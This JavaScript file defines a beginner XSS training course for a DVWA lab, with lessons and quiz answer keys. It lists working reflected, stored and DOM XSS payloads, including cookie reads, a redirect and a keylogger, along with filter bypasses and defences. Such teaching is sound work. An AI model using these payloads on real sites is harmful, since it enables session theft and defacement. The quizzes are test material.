const LESSONS = [
  {
    title: "1. What is XSS and Core Concepts",
    points: 20,
    content: `CROSS-SITE SCRIPTING (XSS) — A BEGINNER'S GUIDE

WHAT IS XSS?
Imagine a giant public notice board in the middle of your school where anyone can pin up a message. Normally, people pin up normal pieces of paper that say things like "Happy Birthday!" or "Lost Dog". But what if a sneaky prankster pins up a special, magical piece of paper that looks totally normal, but actually contains a secret robot command? Because the school principal (the website) never checks the papers before they go on the board, that magical paper sits there waiting. When an innocent student walks by to read the board, the magical paper suddenly comes alive, jumps off the board, and forces the student's brain to do whatever the prankster commanded! This is exactly what Cross-Site Scripting (XSS) is. It happens when a hacker posts a message that isn't just normal text, but is actually a secret piece of computer code (called JavaScript). If the website doesn't clean the message first, the hacker's code runs automatically inside the browser of anyone who looks at the page!

WHY WOULD SOMEONE ATTACK USING XSS?
The goal of an XSS attack is to make the VICTIM'S OWN BROWSER do something harmful. Because the malicious code runs inside the victim's browser on the legitimate website, the browser treats it as trusted. This allows attackers to:

  1. Steal Login Sessions (Cookies):
     Websites give you a special "key" (called a session cookie) when you log in, so you don't have to type your password on every page. If an attacker steals this key, they can pretend to be you without ever needing your password.

  2. Keylogging:
     The attacker's code can secretly record every key you press on the keyboard and send that information to the attacker. This is how passwords and credit card numbers are stolen.

  3. Redirect to Fake Websites:
     The code can silently send you to a convincing-looking fake version of a website (like a fake bank login page) to trick you into entering your real credentials.

  4. Deface the Website:
     The attacker can change what you see on the page, replacing real content with fake messages or warnings.

HOW DOES XSS WORK?
The core mechanism is simple: the website takes something you type (like a comment, a name, or a search term) and pastes it directly into the web page's code without checking it first. Here is the key concept:

  - A web page is built from a language called HTML.
  - Embedded inside HTML are programs written in JavaScript.
  - If an attacker can inject their own JavaScript into the HTML, the browser runs it.

The three main types you will learn in this lab:

  1. Reflected XSS: The attack is inside a link. When the victim clicks the link, the code is "reflected" back off the server into the victim's browser and runs immediately. It only affects the one person who clicks the link.

  2. Stored XSS: The attack code is saved permanently in the website's database (for example, as a forum post). Every single person who visits that page gets attacked. This is the most dangerous type.

  3. DOM XSS: This attack never even touches the server. The malicious code is hidden inside the website's URL and processed entirely by JavaScript running in the victim's browser.

COMMON TOOLS USED IN XSS ATTACKS
When you test for XSS, you use JavaScript functions to prove the vulnerability works:
  - alert(1): Opens a harmless pop-up box. It is the classic "proof of concept" — if you see the pop-up, the code ran.
  - confirm(1): Opens a confirmation dialog box.
  - prompt(1): Opens a box asking for user input.
  - document.cookie: Reads the victim's session cookies (used to prove cookie theft is possible).
  - window.location: Redirects the browser to a different URL.

HOW TO SET UP THE LAB

STEP 1 — Start the Lab Environment:
Click the "Launch DVWA Instance" button above. Wait for your private Docker container to spin up. A Docker container is like a mini virtual computer running just for you.

STEP 2 — Log In:
  Username: admin
  Password: password

STEP 3 — Reset the Database and Set Security:
Scroll down and click "Create / Reset Database". Then go to "DVWA Security" on the left menu, set the level to "Low", and click "Submit".`,
    questions: [
      { q: "What is the default username for our lab?", a: "admin" },
      { q: "What is the default password?", a: "password" },
      { q: "What programming language are XSS attacks written in?", a: "JavaScript" },
      { q: "Which JS function opens a confirmation dialog box?", a: "confirm" }
    ]
  },
  {
    title: "2. DVWA XSS (Reflected) — Practical Attack",
    points: 30,
    content: `REFLECTED XSS — THE ECHO ATTACK

WHAT IS REFLECTED XSS?
Imagine standing in front of a giant canyon and shouting a magic word, and the canyon instantly echoes that exact magic word back to you, causing a spell to hit you right in the face! In Reflected XSS, the website is the canyon. You send a malicious piece of magic code TO the website (usually hidden inside a tricky web link), and the website instantly "echoes" it straight back at you without cleaning it up. The attack doesn't stick to the website forever; it only hits the specific person who shouted it (or the person who was tricked into clicking the sneaky link).

WHY IS IT DANGEROUS?
An attacker creates a specially crafted link and tricks a victim into clicking it (perhaps via email or a chat message). The moment the victim clicks the link, the server bounces the attack code back, and the victim's browser runs it. The victim often sees nothing unusual — just a normal-looking page.

HOW TO PERFORM THE ATTACK IN DVWA

Path in DVWA: Left sidebar → "XSS (Reflected)"

------------------------------------------------------
LOW SECURITY — No Filtering At All
------------------------------------------------------
The server takes whatever you type in the "What's your name?" box and pastes it directly into the page. It does zero checking.

Type this into the name box and click Submit:
  <script>alert(1)</script>

What happens: A pop-up box appears showing "1". This proves your code ran inside the browser. The server blindly included your code in the page.

More payloads to try (they all prove execution):
  <script>alert('XSS')</script>
  <img src=x onerror=alert(1)>
    (This uses an image tag. The src=x is a fake image that fails to load, which triggers the onerror event to run alert(1))
  <svg onload=alert(1)>
    (SVG is an image format that supports events. When the browser loads it, alert(1) runs)
  <script>alert(document.cookie)</script>
    (This shows your session cookies in the pop-up — this is what an attacker would steal)

------------------------------------------------------
MEDIUM SECURITY — Basic Script Tag Blocking
------------------------------------------------------
Medium security blocks the exact text "<script>". If you type <script>, it removes it.
However, it only blocks that one specific word. There are many other HTML tags that can run code:

  <img src=x onerror=alert(1)>
    (Image tags can run code when they fail to load — "script" word not used)
  <svg onload=alert(1)>
    (SVG image tag runs code when it loads)
  <iframe src=javascript:alert(1)>
    (An inline frame can execute JavaScript in its src attribute)
  <input autofocus onfocus=alert(1)>
    (An input box that automatically gets focus, then runs code when it does)
  <ScRiPt>alert(1)</ScRiPt>
    (Mixing UPPER and lower case fools the filter because it only blocks lowercase "script")

------------------------------------------------------
HIGH SECURITY — Strict Word Blocking (Regex)
------------------------------------------------------
High security uses a more powerful filter (called a regular expression) that blocks any tag containing the word "script" in any combination of upper or lower case.

The bypass: avoid using the word "script" entirely. Use only HTML attributes that fire events:
  <img src=x onerror=alert(document.domain)>
    (Works because there is no "script" word at all)
  <input autofocus onfocus=alert(1)>
    (Same — no "script" word)
  " onmouseover="alert(1)
    (This breaks out of an attribute value and injects a new event handler)

------------------------------------------------------
IMPOSSIBLE SECURITY — Proper Defense
------------------------------------------------------
Payloads that fail: <script>alert(1)</script>, <img src=x onerror=alert(1)>

Why they fail: The server uses a function called htmlspecialchars(). This converts every dangerous character into a harmless text version before pasting it into the page:
  - The < character becomes &lt; (displays as the letter < but is NOT treated as a tag)
  - The > character becomes &gt;
  - " becomes &quot;

So your <script> tag becomes the VISIBLE TEXT "&lt;script&gt;" on screen. The browser reads it as text to display, NOT as code to run. The attack is completely neutralized.`,
    questions: [
      { q: "What type of XSS sends the attack in a URL and the server bounces it back?", a: "Reflected XSS" },
      { q: "What HTML tag runs code when an image fails to load (onerror)?", a: "img" },
      { q: "What PHP function converts dangerous characters into safe text (impossible mode)?", a: "htmlspecialchars" }
    ]
  },
  {
    title: "3. DVWA XSS (Stored) — The Permanent Attack",
    points: 30,
    content: `STORED XSS — THE MOST DANGEROUS TYPE

WHAT IS STORED XSS?
Stored XSS is the absolute worst, most dangerous type of XSS. Imagine someone spray-paints a magical trap on a brick wall right in the middle of town. The trap doesn't just bounce off; it is permanently painted there! Every single person who walks past that wall, today, tomorrow, or next year, will accidentally trigger the trap and get hit by the spell! In Stored XSS, the attacker doesn't need to trick you into clicking a special link. Instead, they type their malicious code into a normal comment box on a website, and the website permanently saves it in its database (painting it on the wall). From that moment on, every single person who visits that webpage gets attacked instantly, without clicking anything at all!

WHY IS IT THE MOST DANGEROUS?
  - It is permanent: the attack lives in the database until an admin manually removes it.
  - It affects everyone: not just one victim but every person who views the page.
  - It requires no bait: victims do not need to click a suspicious link.
  - Real-world impact: A stored XSS on a banking website's message board could steal the session cookies of thousands of logged-in users.

HOW TO PERFORM THE ATTACK IN DVWA

Path in DVWA: Left sidebar → "XSS (Stored)"
You will see a Guestbook with a Name field and a Message field.

------------------------------------------------------
LOW SECURITY — No Filtering
------------------------------------------------------
The guestbook stores whatever you type directly into the database without any checking.

In the Message field, type:
  <script>alert(1)</script>

Then click "Sign Guestbook". The page reloads and your code runs immediately (you'll see the alert pop-up). Every time anyone visits this guestbook, the code runs again.

More stored payloads to try:
  <script>alert(document.cookie)</script>
    (Pops up with every visitor's session cookie — this is how session hijacking works)

  <img src=x onerror=alert('stored xss')>
    (Uses the broken image trick — no "script" word needed)

  <script>window.location='http://example.com'</script>
    (Redirects every visitor to a different website — could be a phishing site)

  Keylogger (records and alerts every key pressed):
  <script>document.onkeypress=function(e){ alert(e.key) }</script>
    (Every keystroke a visitor makes — like typing a password — would pop up in an alert)

------------------------------------------------------
MEDIUM SECURITY — Message Box Protected, Name Box Weak
------------------------------------------------------
In Medium, the Message box is now properly protected — it strips any HTML tags you submit. However, the Name field only blocks the lowercase word "script".

There is also a second problem: the Name field has a maximum length of 10 characters set in the HTML, which is too short for our payloads.

How to bypass the 10-character limit:
  1. Right-click on the Name input box and choose "Inspect" (this opens Developer Tools).
  2. You will see HTML code like: maxlength="10"
  3. Double-click the "10" and change it to "100". Press Enter.
  4. The input box now accepts longer text.

Now inject into the NAME field:
  <img src=x onerror=alert(1)>
    (No "script" word, so the filter does not catch it)
  <svg onload=alert(1)>
    (SVG tag is not blocked)
  <div onmouseover=alert(1)>hover me</div>
    (Creates a div that runs code when you hover over it)

------------------------------------------------------
HIGH SECURITY — Strict Regex on Name Field
------------------------------------------------------
High security extends the word blocking to cover "script" in any case combination.
Expand the maxlength to 100 using DevTools (same as Medium) and use payloads with no "script" word:
  <svg/onload=alert(1)>
  <img src=x onerror=alert(document.cookie)>
  " autofocus onfocus=alert(1) x="
    (This breaks out of the existing input attribute and injects a new event)

------------------------------------------------------
IMPOSSIBLE SECURITY — Full Defense
------------------------------------------------------
Payloads fail completely.

Why: The server uses htmlspecialchars() on BOTH the Name and Message fields before saving them to the database. The stored data is also re-encoded before being displayed. Additionally, parameterized database queries (PDO) are used, meaning the data is always treated as DATA and never as code.`,
    questions: [
      { q: "Does Stored XSS save the malicious code permanently in the database? (yes/no)", a: "yes" },
      { q: "Which input box in DVWA Stored XSS has a 10-character limit we bypass with DevTools?", a: "Name" },
      { q: "What JavaScript property reads the victim's session cookies?", a: "document.cookie" }
    ]
  },
  {
    title: "4. DVWA XSS (DOM) — The Invisible Attack",
    points: 30,
    content: `DOM XSS — THE ATTACK THE SERVER NEVER SEES

WHAT IS DOM XSS?
Imagine a magical mirror that changes how you look based on a sticky note you put on your own forehead. The magical mirror never talks to anyone else, it only looks at you! DOM XSS is just like this. DOM stands for Document Object Model, which is just the internal picture your web browser paints of a website. In DOM XSS, the attack happens entirely inside your own web browser (the magic mirror). The malicious code is hidden in a special part of the web address that the server never even sees. Because the server never sees the attack, it can't protect you! Your own web browser reads the hidden code, updates its own internal picture, and accidentally attacks itself!

WHY IS IT HARD TO DETECT?
Traditional security tools monitor what data is sent to the server and what the server sends back. DOM XSS bypasses this entirely because:
  - The attack payload is in the URL hash, which the browser keeps to itself.
  - The malicious code is injected by the website's own JavaScript, not by the server.
  - Server logs show nothing unusual.

HOW TO PERFORM THE ATTACK IN DVWA

Path in DVWA: Left sidebar → "XSS (DOM)"
You will see a dropdown to select a language. Look at the URL — it contains "?default=English".

------------------------------------------------------
LOW SECURITY — Direct URL Injection
------------------------------------------------------
The page JavaScript reads the "default" parameter from the URL and writes it into the page using document.write() — a dangerous function that blindly injects anything into the HTML.

In your browser's address bar, add your payload after "?default=":
  http://[DVWA-IP]/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>
  
  (Replace [DVWA-IP] with your actual DVWA address and press Enter)

More payloads:
  ?default=<img src=x onerror=alert(1)>
  ?default=<svg onload=alert(1)>
  ?default=<script>alert(document.cookie)</script>

------------------------------------------------------
MEDIUM SECURITY — Server Checks the URL (But Not the Hash)
------------------------------------------------------
Medium adds a server-side check: if the URL parameter contains the text "<script", the server redirects you. This blocks basic payloads.

The bypass uses the URL hash (#):
  ?default=English#<img src=x onerror=alert(1)>

Why this works: Everything after the # symbol is called the "hash fragment". The browser NEVER sends the hash to the server. The server only sees "?default=English" and allows it. But then the page's JavaScript reads the full URL including the hash and injects your code.

Other bypasses:
  ?default=</option></select><img src=x onerror=alert(1)>
    (Breaks out of the existing dropdown HTML structure and injects a new tag)

------------------------------------------------------
HIGH SECURITY — Server Whitelist
------------------------------------------------------
High security checks the "default" parameter against an approved list of languages (English, French, etc.). Any unknown value is rejected.

The hash bypass still works completely:
  ?default=English#<svg onload=alert(document.domain)>
  ?default=English#<iframe src=javascript:alert(1)>

The server sees "?default=English" — which is on the whitelist — and approves it. The attack is in the hash, which is processed only by the browser's JavaScript.

------------------------------------------------------
IMPOSSIBLE SECURITY — Safe DOM APIs
------------------------------------------------------
Payloads fail completely.

Why: The Impossible version stops using dangerous DOM functions like document.write() and innerHTML. Instead, it uses textContent. The difference is critical:
  - innerHTML: treats the data as HTML code and renders it (dangerous)
  - textContent: treats the data as plain text to display (safe)

When textContent is used, your <script> tag is shown on screen as the literal characters "<script>" rather than being executed as code.`,
    questions: [
      { q: "Where does DOM XSS happen entirely — on the server or in the browser?", a: "browser" },
      { q: "What URL symbol (#) hides the attack payload from the server?", a: "#" },
      { q: "Which dangerous DOM property injects HTML and can run code?", a: "innerHTML" },
      { q: "Which safe DOM property treats content as plain text and cannot run code?", a: "textContent" }
    ]
  },
  {
    title: "5. Bypasses, Tools and Ultimate Defense",
    points: 30,
    content: `ADVANCED BYPASSES AND HOW TO PROPERLY DEFEND AGAINST XSS

WHAT ARE FILTER BYPASSES?
Imagine a teacher who makes a list of "Bad Words" that students are not allowed to say. If a student tries to write a bad word, the teacher erases it. This is called "blacklisting," and websites use it to try to block XSS attacks by erasing words like "script". The problem is, kids are very clever! If the teacher blocks the word "mad", the kids will just say "angry" or "furious". Attackers do the exact same thing! If a website blocks one type of attack code, attackers will just write the exact same code in dozens of different, sneaky ways using different words or symbols. As long as just ONE of their sneaky methods tricks the teacher, the attack succeeds!

BYPASS 1 — Mixed Case:
  The filter might only block the exact lowercase text "<script>". By mixing upper and lowercase letters, you spell the same thing differently:
  <ScRiPt>alert(1)</ScRiPt>
  The browser does not care about case — it runs it as script code.

BYPASS 2 — Different Tags:
  Instead of using <script>, use other HTML tags that can also execute code:
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  <body onpageshow=alert(1)>
  These do not contain the word "script" at all, so script-blocking filters miss them entirely.

BYPASS 3 — No Quotes:
  Some filters remove quotation marks. Payloads can be written without them:
  <img src=x onerror=alert(1)>
  (The onerror value has no quotes and still works)

BYPASS 4 — Backtick Instead of Parentheses:
  Some filters remove parentheses ( and ). Backticks can sometimes be used instead:
  <svg/onload=alert\`1\`>

BYPASS 5 — URL Encoding:
  Characters can be converted to their "percent-encoded" URL form. Weak filters looking for "<script>" in readable text would miss:
  %3Cscript%3Ealert(1)%3C/script%3E
  (Here, %3C means "<" and %3E means ">")

AUTOMATED TESTING TOOLS
Real security professionals use automated tools to find XSS vulnerabilities at scale:

  1. Burp Suite (Intruder Mode):
     Burp Suite acts as a "man in the middle" between your browser and the website. It captures every request you make, and using its "Intruder" feature, you can automatically send hundreds of different XSS payloads and look for which ones cause the website to change its response.

  2. XSStrike:
     A specialized command-line tool built specifically for XSS. It analyzes the web page's HTML structure, figures out exactly where your input is being placed, and generates custom payloads designed to work in that specific context.

  3. OWASP ZAP:
     A free, open-source security scanner. It automatically crawls a website and tests every input field and URL parameter for XSS and other vulnerabilities.

THE WRONG WAY TO DEFEND — BLACKLISTING
Many websites try to defend against XSS by maintaining a list of "bad" words or characters to block or remove. This is called blacklisting and it is fundamentally flawed.

Why it fails: The list can never be complete. There are hundreds of different ways to inject malicious code. For every word you block, an attacker can find an alternative. This approach is like trying to keep criminals out of a building by listing every possible thing they might say — but criminals can always say something new.

THE RIGHT WAYS TO DEFEND

DEFENSE 1 — Output Encoding (The Most Important):
Every single time user-supplied data is displayed on a web page, it must be "encoded" first. This means converting dangerous characters into their harmless display versions:
  - The character < becomes &lt; (displays as the text "<" but is NOT an HTML tag)
  - The character > becomes &gt;
  - The character " becomes &quot;

PHP uses htmlspecialchars() to do this. After encoding, your <script> becomes the visible text "&lt;script&gt;" — which the browser shows as text on screen, not as a code tag to execute.

DEFENSE 2 — Use Safe DOM APIs:
When JavaScript code needs to put content into a web page, developers must use safe methods:
  - SAFE: element.textContent = userInput
    (Treats userInput as plain text — tags are displayed, not executed)
  - DANGEROUS: element.innerHTML = userInput
    (Treats userInput as HTML code — tags ARE executed)

DEFENSE 3 — Content Security Policy (CSP):
CSP is a special instruction sent in the server's HTTP headers. It tells the browser: "Only run scripts from these specific approved sources. If a script comes from anywhere else — including code injected directly into the page — ignore it." This is a powerful extra layer that limits the damage even if an XSS injection somehow gets through.`,
    questions: [
      { q: "Is blacklisting (blocking specific bad words) an effective XSS defense? (yes/no)", a: "no" },
      { q: "What defense converts dangerous characters like < into safe display text like &lt;? (Output...)", a: "Output Encoding" },
      { q: "What HTTP header instructs the browser to only run scripts from approved sources? (Content Security...)", a: "Content Security Policy" },
      { q: "What is a payload called that combines multiple bypass techniques to evade complex filters?", a: "Polyglot" }
    ]
  }
];
